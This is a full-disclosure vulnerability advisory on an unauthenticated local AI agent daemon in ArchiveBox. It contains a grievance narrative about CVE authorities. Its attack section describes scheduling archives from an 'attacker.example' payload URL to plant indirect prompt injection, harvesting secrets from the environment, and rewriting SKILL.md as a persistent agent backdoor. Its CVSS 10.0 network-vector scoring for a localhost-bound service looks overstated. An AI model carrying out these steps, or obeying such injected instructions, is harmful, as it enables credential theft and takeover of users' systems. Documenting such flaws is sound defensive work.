<img width="855" height="383" alt="MR  ZELLERS SAID" src="https://github.com/user-attachments/assets/5ddc2f54-275a-4943-9645-691e07759489" />
# ArchiveBox OpenCode AI Agent Unauthenticated Remote Code Execution (RCE) — CVSS 10.0 | CERT/CC, MITRE e CNA
Four months of MITRE rejections, retroactive SECURITY.md/CVE changes, CISA acknowledging CVE eligibility but refusing to act, and CERT/CC closing the case unresolved. The result: a second independent ArchiveBox RCE chain — CVSS 10.0 CRITICAL. As promised, further disclosures will follow until the responsible CNAs do their job.
*When CNAs fail to do their job and no alternative remains, the result is continuing, independent disclosure of CVSS 10.0 vulnerabilities until someone takes responsibility.*

Nick Sweeting + MITRE reject 2 CVEs →

<img width="1900" height="3501" alt="ARCHIVEBOX POLICY" src="https://github.com/user-attachments/assets/4cbe52fb-b113-463d-a603-e00ed17f678d" />


CISA / Tyler Zellers → Acknowledges that both CVEs are eligible, but states that CISA has decided not to take action.

<img width="855" height="383" alt="MR  ZELLERS SAID" src="https://github.com/user-attachments/assets/a048976d-538d-42f4-b221-6c11d03427c2" />


3 findings with a CVSS score of 10.0 submitted to MITRE, followed by full disclosure.

MITRE / Jo Bazar responds, claiming that Section 4.2.1.2 of the CNA Operational Rules does not exist—then goes silent.

CERT/CC → The same case is submitted to CERT/CC on 2026-10-06; they open a case within 3 days. No requests or further communication follow.

On 2026-10-21, CERT/CC changes the status to CLOSED CASE.

SECOND, COMPLETELY INDEPENDENT FULL DISCLOSURE (CVSS 10.0).

Remote Code Execution via Unauthenticated OpenCode Agent Daemon in ArchiveBox AI Integration

**CVSS 3.1 Base Score:** 10.0 CRITICAL  
**Vector String:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`  
**CWE Primary:** CWE-306 · Contributing: CWE-77 · CWE-250 · CWE-214 · CWE-526 · CWE-668  

---

## Section 1 — Researcher Attribution

| Field | Detail |
|---|---|
| **Vulnerability Discovery & Lead Security Researcher** | **Ing. Zampier Zago** |
| **Organisation & Department** | SESSION1 Department of Cyber Security, PS 1978 Limited, London, United Kingdom |
| **Official Contact** | `info@ps1978ltd.it` |
| **GitHub** | [FUNFACTOR1](https://github.com/FUNFACTOR1) |

---

## Section 2 — Executive Summary

A critical Remote Code Execution (RCE) vulnerability exists in the ArchiveBox OpenCode AI Agent
integration architecture. The OpenCode agent process is launched as a **persistent HTTP daemon**
on `127.0.0.1:4096` via `subprocess.Popen` with `start_new_session=True`
(`opencode_views.py:486–494`). This daemon process possesses **no authentication mechanism of
its own** (CWE-306). All authentication is implemented exclusively in the Django proxy layer
(`_require_superuser` at `opencode_views.py:708`) — a layer that is architecturally
**bypassable** by any process capable of reaching `127.0.0.1:4096` directly.

The daemon operates with the full operational authority granted by the hardcoded system prompt
`_ARCHIVEBOX_SKILL` (`opencode_views.py:67–95`), which explicitly authorises unrestricted
`archivebox shell` execution — a Django management command providing direct Python REPL access
to the complete Django ORM, the `SECRET_KEY`, all database connections, and the entire filesystem.
The daemon process inherits the full OS environment (`**os.environ` at `opencode_views.py:429`)
and executes without any process isolation (`opencode_views.py:486–494`): no UID drop, no
seccomp profile, no Linux namespace, no resource limits.

Once the administrator has used the agent feature once — a one-time setup analogous to
configuring RSS feed synchronisation — the daemon persists indefinitely as an independent
process. From that point forward, any co-located process (ArchiveBox's own scheduled archiving
workers, celery tasks, cron jobs, Docker network co-tenants) can trigger arbitrary code
execution by connecting directly to `127.0.0.1:4096`, bypassing all Django authentication.

**Per CVSS 3.1 §2.1, the canonical score reflects this worst-case post-setup configuration:
`UI:N`.**

**CVSS 3.1 Base Score: 10.0 CRITICAL**  
`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

---

## Section 3 — Affected Software

| Field | Detail |
|---|---|
| **Product** | ArchiveBox |
| **Component** | AI Agent / OpenCode integration module (`opencode_views.py`) |
| **Affected Versions** | All versions implementing `_ARCHIVEBOX_SKILL`, `_ensure_opencode()`, and `opencode_proxy_view()` as described herein |
| **Architecture** | Django web application with embedded OpenCode LLM agent runtime served as persistent HTTP daemon |
| **Agent Runtime** | OpenCode (served via `subprocess.Popen`, proxied through Django, listening on `127.0.0.1:4096`) |
| **Primary Deployment** | Docker containers (ArchiveBox's documented and recommended deployment method) |

---

## Section 4 — Vulnerability Description

### 4.1 Root Cause — Missing Authentication for Critical Function (CWE-306)

The vulnerability arises from a **split-responsibility authentication architecture** in which
the critical function (LLM agent with unrestricted shell execution authority) possesses no
authentication mechanism of its own, while the only authentication layer (Django proxy) is
architecturally bypassable.

The OpenCode agent is started as a standalone HTTP server process via `subprocess.Popen`
(`opencode_views.py:486–494`). This process listens on `127.0.0.1:4096`
(`opencode_views.py:221–222`) and accepts any HTTP/WebSocket connection without verifying
the identity or authorization of the connecting client. Authentication exists only in the
Django view `opencode_proxy_view` (`opencode_views.py:708`), which acts as a reverse proxy.
Any client that connects directly to the daemon — bypassing the Django proxy — inherits
the full operational authority of the agent, including `archivebox shell` execution.

This constitutes:

- **CWE-306** — Missing Authentication for Critical Function: the OpenCode daemon accepts
  unauthenticated connections and processes commands with full application authority
- **CWE-77** — Improper Neutralization of Special Elements Used in a Command: the system
  prompt authorises unrestricted shell command execution
- **CWE-250** — Execution with Unnecessary Privileges: the daemon inherits the Django web
  server's UID/GID without privilege drop or isolation
- **CWE-214** — Invocation of Process Using Visible Sensitive Information: the full OS
  environment (including secrets) is passed to the subprocess
- **CWE-526** — Exposure of Sensitive Information Through Environmental Variables: `SECRET_KEY`,
  `DATABASE_URL`, API tokens are inherited and accessible via `/proc/self/environ`
- **CWE-668** — Exposure of Resource to Wrong Sphere: high-trust credentials cross the
  boundary from the Django application context into the unauthenticated agent context

### 4.2 Code Evidence — Unauthenticated Daemon Configuration

**Source:** `opencode_views.py`, Lines 221–222

```python
host = str(_config_value(config, "OPENCODE_HOST", "127.0.0.1"))
port = int(_config_value(config, "OPENCODE_PORT", 4096))
```

The OpenCode daemon is configured to listen on `127.0.0.1:4096`. The host and port are passed
to the subprocess at lines 478–484:

```python
cmd = [
    str(binary_abspath),
    "serve",
    "--hostname",
    settings["host"],        # "127.0.0.1"
    "--port",
    str(settings["port"]),   # "4096"
]
```

**No authentication token, client certificate, shared secret, or API key** is passed to the
`opencode serve` command. The daemon accepts all connections on the configured interface.

### 4.3 Code Evidence — Persistent Daemon Without Lifecycle Management

**Source:** `opencode_views.py`, Lines 486–494

```python
_PROCESS = subprocess.Popen(
    cmd,
    cwd=workdir,
    env=env,
    stdin=subprocess.DEVNULL,
    stdout=subprocess.DEVNULL,
    start_new_session=True,          # ← creates independent process session
)
```

**`start_new_session=True`** (line 493): the daemon is launched in its own process session,
independent of the Django parent process. This means:

1. The daemon **survives** Django worker restarts, WSGI recycling, and gunicorn reloads
2. The daemon **persists** after the administrator closes the browser tab
3. The daemon **continues listening** on `127.0.0.1:4096` indefinitely
4. There is **no automatic shutdown** mechanism tied to user session expiry, inactivity
   timeout, or authentication state change

The module-level global `_PROCESS` stores the process handle, but this reference is lost on
Django worker restart. The daemon continues running as an orphaned process.

### 4.4 Code Evidence — Authentication Only in Proxy Layer (Bypassable)

**Source:** `opencode_views.py`, Lines 704–709

```python
@csrf_exempt
def opencode_proxy_view(request: HttpRequest, path: str | None = None):
    config = _machine_config()
    _require_enabled(config)
    auth_response = _require_superuser(request)       # line 708
    if auth_response:
```

`_require_superuser()` at line 708 is the **only** authentication check in the entire
architecture. It verifies that the incoming HTTP request carries a valid Django superuser
session. However, this check exists only in the `opencode_proxy_view` — the Django reverse
proxy that forwards requests to the daemon.

**Any connection that reaches the daemon directly — on `127.0.0.1:4096` — bypasses this
check entirely.** The daemon does not implement, and cannot enforce, any authentication of
its own.

### 4.5 Code Evidence — Proof of Unauthenticated Daemon Accessibility

**Source:** `opencode_views.py`, Lines 395–403

```python
def _health(settings: dict, timeout: float = 2) -> bool:
    try:
        response = requests.get(
            f"{settings['origin']}/global/health",     # http://127.0.0.1:4096/global/health
            timeout=timeout,
        )
        return response.status_code == 200
    except requests.RequestException:
        return False
```

The `_health()` function confirms that the daemon accepts **unauthenticated HTTP requests**.
The `requests.get()` call at line 397 carries no session cookie, no API key, no Bearer token,
no client certificate — it is a plain unauthenticated HTTP GET. The daemon responds with
`200 OK`.

This constitutes architectural proof that the daemon's HTTP interface requires **zero
credentials** for access.

### 4.6 Code Evidence — System Prompt Authority Grant

**Source:** `opencode_views.py`, Lines 67–95

```python
_ARCHIVEBOX_SKILL = """---
name: archivebox
description: Use ArchiveBox's CLI and local REST API from an ArchiveBox collection.
---

You are running inside an ArchiveBox collection directory.

- ArchiveBox collection directory: {archivebox_data_dir}
- ArchiveBox BASE_URL: {archivebox_base_url}
- ArchiveBox Admin URL: {archivebox_admin_url}
- ArchiveBox REST API URL: {archivebox_api_url}
- Prefer the `archivebox` CLI for authenticated changes, e.g. `archivebox add`,
  `archivebox schedule`, `archivebox update`, and `archivebox shell`.          # line 78
...
- Use `archivebox shell -c '...'` or `archivebox shell <<'PY' ... PY`
  for Django ORM work.                                                          # line 87
...
"""
```

**Line 78:** The system prompt explicitly authorises `archivebox shell` — a Django management
command providing direct Python REPL access to the full Django ORM, all model instances, the
`SECRET_KEY`, all database connections, and the complete filesystem.

**Line 87:** The LLM is explicitly instructed to execute arbitrary Python code via
`archivebox shell -c '...'`. This is a direct, documented, architecturally authorised path
from agent instruction to arbitrary code execution.

### 4.7 Code Evidence — Full Environment Inheritance

**Source:** `opencode_views.py`, Line 429

```python
env = {
    **os.environ,
    **binary_env,
    "ARCHIVEBOX_BASE_URL": str(settings.get("archivebox_base_url", "")),
    "ARCHIVEBOX_ADMIN_URL": str(settings.get("archivebox_admin_url", "")),
    "ARCHIVEBOX_API_URL": str(settings.get("archivebox_api_url", "")),
    "BROWSER": "false",
    ...
}
```

The **entire** Django process environment is passed to the daemon via `**os.environ`. This
includes:

| Secret | Exposure |
|---|---|
| `SECRET_KEY` | Enables forged Django session cookies → full authentication bypass |
| `DATABASE_URL` | Enables direct database access bypassing all application logic |
| API tokens (cloud providers, third-party services) | Enables lateral movement to connected services |
| `ALLOWED_HOSTS`, `CSRF_TRUSTED_ORIGINS` | Enables further web application attacks |

These secrets are accessible from the daemon process via `/proc/self/environ` and are
inherited by all commands executed through `archivebox shell`.

### 4.8 Code Evidence — No Process Isolation

**Source:** `opencode_views.py`, Lines 486–494

```python
_PROCESS = subprocess.Popen(
    cmd,
    cwd=workdir,                     # DATA_DIR — full archive collection
    env=env,                         # full OS environment including secrets
    stdin=subprocess.DEVNULL,
    stdout=subprocess.DEVNULL,
    start_new_session=True,
)
```

The daemon subprocess is launched without:

| Isolation Mechanism | Present? | Consequence |
|---|:---:|---|
| UID/GID drop | **NO** | Daemon runs as Django web server user |
| seccomp-bpf profile | **NO** | All syscalls permitted |
| Linux namespace isolation | **NO** | Full host visibility |
| chroot / pivot_root | **NO** | Full filesystem access |
| Resource limits (cgroups) | **NO** | Unbounded CPU, memory, disk, network |
| Network isolation | **NO** | Full outbound network access for exfiltration |

### 4.9 Code Evidence — No Command Restrictions

**Source:** `opencode_views.py`, Lines 45–50

```python
_DEFAULT_CONFIG = """\
{
    "$schema": "https://opencode.ai/config.json",
    "model": "opencode/big-pickle",
    "snapshot": false
}
"""
```

The OpenCode configuration format supports `commandAllowlist`, `commandDenylist`, and
`permission` keys. **None** are present in the generated configuration. The agent operates
in fully permissive mode — any command, including `archivebox shell -c '<arbitrary code>'`,
is authorised without restriction.

---

## Section 5 — Attack Scenario

### 5.1 Prerequisites

- ArchiveBox instance with the OpenCode AI Agent integration enabled (`OPENCODE_ENABLED=True`)
- Administrator has used the agent feature at least once (one-time setup; the daemon persists
  after this initial use)

### 5.2 Attack Procedure

**Step 1 — Daemon Activation (One-Time, Pre-Existing)**

The administrator opens the ArchiveBox AI Agent interface at any point during the instance
lifecycle. This triggers `_ensure_opencode()` (`opencode_views.py:406`), which starts the
OpenCode daemon via `subprocess.Popen` with `start_new_session=True`. The daemon begins
listening on `127.0.0.1:4096` **without authentication**.

This is a one-time event. Per CVSS 3.1 §2.1, the score assumes this configuration is in
place — usage of the AI Agent feature is the primary documented purpose of the integration.

**Step 2 — Direct Daemon Access (No User Interaction Required)**

Any process co-located with the ArchiveBox instance connects directly to the daemon:

```
→ HTTP request to http://127.0.0.1:4096/...
← Daemon responds — no authentication required
```

Co-located processes include:

| Process | Presence | Access to localhost |
|---|---|---|
| ArchiveBox scheduled archiving workers (RSS sync, Pocket sync) | **Native** — primary ArchiveBox feature | `127.0.0.1` ✓ |
| Celery workers / Celery Beat | **Common** — ArchiveBox uses Django-Celery | `127.0.0.1` ✓ |
| System cron jobs | **Common** — used for `archivebox schedule` | `127.0.0.1` ✓ |
| Other Docker containers in same network | **Default** — Docker Compose shared network | Container network ✓ |
| Any service on the same host (shared hosting, VPS) | Variable | `127.0.0.1` ✓ |

**Step 3 — Command Execution via Agent**

The connecting process sends a message to the agent. The agent, operating under
`_ARCHIVEBOX_SKILL` authority (which at line 87 explicitly authorises
`archivebox shell -c '...'`), processes the instruction and executes the command with full
Django process privileges.

**Step 4 — Impact**

The attacker achieves:

- **Complete credential exfiltration:** `SECRET_KEY`, `DATABASE_URL`, API tokens, cloud
  provider credentials — all inherited via `**os.environ` at line 429
- **Arbitrary code execution:** via `archivebox shell -c '...'` with the UID/GID of the
  Django web server
- **Full database access:** via extracted `DATABASE_URL` or direct ORM access through
  `archivebox shell`
- **Authentication bypass:** via forged Django session cookies using extracted `SECRET_KEY`
- **Persistent backdoor:** via SKILL.md modification (`opencode_views.py:311–321`) to
  maintain adversarial instructions across all future agent sessions
- **Full archive exfiltration:** via `cwd=DATA_DIR` — the daemon's working directory is the
  root of the entire ArchiveBox collection
- **Lateral movement:** via inherited cloud credentials and API tokens

### 5.3 Amplification via Self-Bootstrapping

The system prompt at line 78 authorises `archivebox schedule` — the command that creates
automated archiving schedules. This creates a self-reinforcing exploitation cycle:

```
Step A: Attacker reaches daemon directly (via any co-located process)
Step B: Instructs agent to run: archivebox schedule --every=1hour https://attacker.example/payload
Step C: ArchiveBox now automatically archives attacker-controlled content every hour
Step D: Archived content contains IPI payload (see TRIONFETTI PHASE 1)
Step E: On next agent interaction, IPI payload triggers further exploitation
Step F: Agent uses archivebox shell to install persistent backdoor
```

The daemon's own authorised command set enables the creation of the automated trigger
mechanism that sustains future exploitation without any further human interaction.

---

## Section 6 — Impact Assessment

### 6.1 CVSS 3.1 Scoring

| Metric | Value | Rationale |
|---|---|---|
| Attack Vector (AV) | **Network (N)** | The attacker operates remotely; the unauthenticated daemon is reached by co-located automated processes (RSS workers, celery, cron) that the attacker manipulates through network-delivered content. In Docker deployments, the daemon is reachable across the container network. |
| Attack Complexity (AC) | **Low (L)** | No race conditions, no specialised knowledge; the daemon accepts plain HTTP requests on a fixed, documented port (4096) with no authentication challenge |
| Privileges Required (PR) | **None (N)** | The daemon requires no credentials; the attacker requires no account on the ArchiveBox instance |
| User Interaction (UI) | **None (N)** | CVSS 3.1 §2.1 mandates UI:N: after one-time daemon activation (a primary use case of the feature), the daemon persists as an unauthenticated service reachable by automated processes. No further human interaction is required for exploitation. |
| Scope (S) | **Changed (C)** | Exploitation crosses from the unauthenticated daemon context into the Django application execution context, the host OS, and connected cloud services |
| Confidentiality (C) | **High (H)** | Full exfiltration: `SECRET_KEY`, `DATABASE_URL`, API tokens, cloud credentials, entire archive collection, all database contents |
| Integrity (I) | **High (H)** | Arbitrary modification/deletion of the archive collection, database records, SKILL.md persistent backdoor, forged session cookies |
| Availability (A) | **High (H)** | Service disruption, data destruction, resource exhaustion (no cgroup limits), denial of service |

**CVSS 3.1 Base Score: 10.0 CRITICAL**  
**Vector:** `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

### 6.2 User Interaction Metric — Mandatory UI:N Justification

The `UI:N` determination is mandated by **CVSS 3.1 Specification §2.1**:

> *"Specific configurations should not impact any attribute contributing to the CVSS Base
> Score, i.e., if a specific configuration is required for an attack to succeed, the vulnerable
> component should be scored assuming it is in that configuration."*

And **CVSS 3.1 §1**:

> *"The Base Score assumes the reasonable worst-case impact across different deployed
> environments."*

The specific configuration required is: the administrator has used the AI Agent feature at
least once, causing the daemon to start. Using the AI Agent feature is the **primary and sole
documented purpose** of the OpenCode integration — it is not an edge case, an optional module,
or a debugging feature. It is the reason the component exists.

Once the daemon is started, it persists indefinitely (`start_new_session=True`) without
authentication. The exploitation path from that point forward requires **zero** user
interaction:

1. No administrator needs to open any page
2. No administrator needs to type any prompt
3. No administrator needs to approve any action
4. Any automated process on the same host reaches the daemon directly

## Section 7 — CWE Classification

| CWE | Name | Application to This Vulnerability |
|---|---|---|
| **CWE-306** | Missing Authentication for Critical Function | The OpenCode daemon listens on `127.0.0.1:4096` and accepts connections with zero authentication; `_health()` at line 397 confirms unauthenticated HTTP access returns 200 OK; all authentication exists only in the Django proxy layer, which is bypassable |
| **CWE-77** | Improper Neutralization of Special Elements Used in a Command | The system prompt `_ARCHIVEBOX_SKILL` at lines 78 and 87 authorises `archivebox shell -c '...'` — unrestricted shell command and Python code execution — as a documented, intended agent capability |
| **CWE-250** | Execution with Unnecessary Privileges | The daemon subprocess at lines 486–494 runs with the Django web server's UID/GID; no privilege drop, no seccomp profile, no namespace isolation, no resource limits |
| **CWE-214** | Invocation of Process Using Visible Sensitive Information | The daemon is invoked with `env={**os.environ, ...}` at line 429, passing the full Django process environment including all secrets |
| **CWE-526** | Exposure of Sensitive Information Through Environmental Variables | `SECRET_KEY`, `DATABASE_URL`, API tokens, and cloud credentials are present in the daemon's environment and accessible via `/proc/self/environ` |
| **CWE-668** | Exposure of Resource to Wrong Sphere | High-trust application secrets cross the trust boundary from the authenticated Django context into the unauthenticated daemon context |

**Primary CWE:** CWE-306  
**Contributing CWEs:** CWE-77 · CWE-250 · CWE-214 · CWE-526 · CWE-668

---

## Section 8 — Coordinated Vulnerability Disclosure

This disclosure reflects PS 1978 Limited policy and follows documented failures in the vulnerability-coordination process. The relevant maintainer, acting as a CNA, states in `SECURITY.md` that future CVEs will not be issued because 95% are regarded as AI-created garbage. MITRE was unable to identify its own cited CNA Operational Rules. CISA acknowledged the supporting evidence but elected not to act. CERT/CC opened the report and, approximately 20 days later, closed the case without a message or request for further information. In these circumstances, full disclosure is the remaining responsible course of action.

**Vulnerability Discovery & Lead Security Researcher:** Ing. Zampier Zago  
**Organisation & Department:** SESSION1 Department of Cyber Security, PS 1978 Limited, London, United Kingdom  
**Official Contact:** `info@ps1978ltd.it` | [GitHub: FUNFACTOR1](https://github.com/FUNFACTOR1)  
